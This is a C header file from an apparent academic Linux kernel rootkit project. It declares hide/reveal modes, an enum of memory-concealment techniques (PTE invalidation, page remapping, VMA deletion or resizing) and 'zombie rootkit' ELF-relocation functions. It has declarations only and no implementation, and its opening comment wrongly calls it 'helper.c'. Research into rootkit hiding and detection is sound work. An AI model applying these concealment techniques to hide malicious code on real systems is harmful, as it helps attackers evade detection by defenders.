/* helper.c -- general helper functions
 *
 * Copyright (C) 2019 Patrick Reichenberger
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 */
#ifndef MATHESIS_ROOTKIT_MODULE_H
#define MATHESIS_ROOTKIT_MODULE_H

#define NETLINK_USER 31
#include <linux/module.h>
/* Activates manual mode if defined, automatic mode if not */
//#define MANUAL_MODE

/* Activates hiding with zombie rootkit */
#define ZOMBIE_HIDE

enum {
    HIDE,
    REVEAL
};

/* Defines the hiding techniques. */
enum {
    INVALIDATE_PTES,
    REMAP_PAGES,
    DELETE_VMAS,
    MODIFY_VMA_LIMITS,
    DELETE_PTES_VMAS,
};
extern int technique;

/* Functions for zombie rootkit */
#ifdef ZOMBIE_HIDE
int zombie_create(void);
void zombie_relocate(void);
void reloc_rewrite_sections(Elf64_Ehdr *, Elf64_Shdr *, char *);
Elf64_Shdr *reloc_resolve_symbols(Elf64_Ehdr *, Elf64_Shdr *, char *);
void reloc_perform_relocation(Elf64_Ehdr *, Elf64_Shdr *, char *, Elf64_Shdr *);
#endif

#endif //MATHESIS_ROOTKIT_MODULE_H
